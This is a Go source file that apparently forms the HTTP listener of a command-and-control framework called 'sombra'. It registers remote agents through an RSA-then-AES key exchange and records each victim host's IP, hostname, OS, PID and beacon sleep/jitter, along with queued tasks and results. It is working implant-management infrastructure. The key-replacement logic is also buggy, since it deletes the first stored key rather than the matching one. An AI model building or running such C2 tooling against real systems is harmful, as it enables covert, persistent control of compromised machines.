package listeners

import (
	"crypto/rsa"
	"encoding/json"
	"fmt"
	"net/http"
	"sync"

	"sombra/cmd/crypto"

	"github.com/gin-gonic/gin"
)

type AgentKeys struct {
	UID   string
	Key   []byte
	Nonce []byte
}

type Envelope struct {
	Agent  Agent
	Task   Task
	Result Result
}

type Registration struct {
	UID      string
	IP       string
	State    int
	Optional string
}

type Agent struct {
	IP       string
	ExtIP    string
	Hostname string
	Sleep    string
	Jitter   string
	OS       string
	UID      string
	PID      string
}

type Task struct {
	UID       string
	CommandID string
	Command   string
}

type Result struct {
	CommandID string
	Result    string
}

type Callback struct {
	AgentUID     string
	LastCallback int
}

type State struct {
	/*
		danger: the state is passed by reference to listeners!! this is _mutable_
	*/
	Data Shared
	mu   sync.Mutex
}

type Shared struct {
	AgentKeys      []AgentKeys
	AgentList      []Agent
	AgentTasks     []Task
	AgentResults   []Result
	AgentCallbacks []Callback
}

type Route struct {
	Method  string
	Path    string
	Handler gin.HandlerFunc
}

type RouteConfig struct {
	Routes []Route
}

var (
	KEX = 0x45
	AES = 0x60
	END = 0x90
)

func PackageEnvelop(agent Agent, task Task, result Result) Envelope {
	return Envelope{
		Agent:  agent,
		Task:   task,
		Result: result,
	}
}

func NewState() *State {
	return &State{
		Data: Shared{},
	}
}

func (s *State) DeleteAgent(uid string) {
	for i, agent := range s.Data.AgentList {
		if agent.UID == uid {
			s.Data.AgentList = append(s.Data.AgentList[:i], s.Data.AgentList[i+1:]...)
			break
		}
	}
}

func (s *State) AddAgent(agent Agent) error {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, a := range s.Data.AgentList {
		if a.UID == agent.UID {
			return fmt.Errorf("agent already exists")
		}
	}

	s.Data.AgentList = append(s.Data.AgentList, agent)
	return nil
}

func (s *State) AddAgentKey(uid string, key []byte, nonce []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, agent := range s.Data.AgentKeys {
		if agent.UID == uid {
			/* if the agent already has a key, remove it */
			s.Data.AgentKeys = append(s.Data.AgentKeys[:0], s.Data.AgentKeys[1:]...)

			/* Since there's a new key, we also need to kill the old agent */
			s.DeleteAgent(uid)
			break
		}
	}

	s.Data.AgentKeys = append(s.Data.AgentKeys, AgentKeys{UID: uid, Key: key, Nonce: nonce})
}

func (s *State) FindAgentKey(uid string) (nonce []byte, key []byte) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for _, agent := range s.Data.AgentKeys {
		if agent.UID == uid {
			return agent.Nonce, agent.Key
		}
	}

	return nil, nil
}

func Start(port string, sharedState *State, publicKey *rsa.PublicKey, privateKey *rsa.PrivateKey) error {
	r := gin.Default()

	r.GET("/", func(c *gin.Context) {
		c.JSON(http.StatusOK, gin.H{"message": "Hello, World!"})
	})

	r.POST("/register", func(c *gin.Context) {
		var reg Registration
		if err := c.BindJSON(&reg); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"error": "invalid request"})
			return
		}

		switch reg.State {
		case KEX:
			publicKey, err := json.Marshal(publicKey)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to marshal public key"})
				return
			}

			c.JSON(http.StatusOK, gin.H{"public_key": publicKey})
		case AES:
			b64_encrypted_key := reg.Optional
			encrypted_key, err := crypto.Base64Decode(b64_encrypted_key)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to decode base64 encrypted key"})
				return
			}

			decrypted_key, err := crypto.DecryptRSA(privateKey, encrypted_key)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to decrypt AES key"})
				return
			}

			nonce, key, err := crypto.SplitSessionKey(decrypted_key)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to split session key"})
				return
			}

			sharedState.AddAgentKey(reg.UID, key, nonce)

			c.JSON(http.StatusOK, gin.H{"message": "AES key exchange successful"})

		case END:

			uid := reg.UID
			nonce, sk := sharedState.FindAgentKey(uid)
			if nonce == nil || sk == nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to find agent key"})
				return
			}

			b64_encrypted_data := reg.Optional
			encrypted_data, err := crypto.Base64Decode(b64_encrypted_data)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to decode base64 encrypted data"})
				return
			}

			decrypted_data, err := crypto.DecryptAES(sk, nonce, encrypted_data)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to decrypt data"})
				return
			}

			var agent_data Agent
			if err := json.Unmarshal(decrypted_data, &agent_data); err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to unmarshal agent data"})
				return
			}

			err = sharedState.AddAgent(agent_data)
			if err != nil {
				c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to register agent"})
				return
			}

			c.JSON(http.StatusOK, gin.H{"message": "Registration complete"})

		}
	})

	go func() {
		if err := r.Run(":" + port); err != nil {
			/*
				Theoretically, this should never error out; however, if it does, something likely went very wrong
			*/
			panic(err)
		}
	}()

	return nil
}
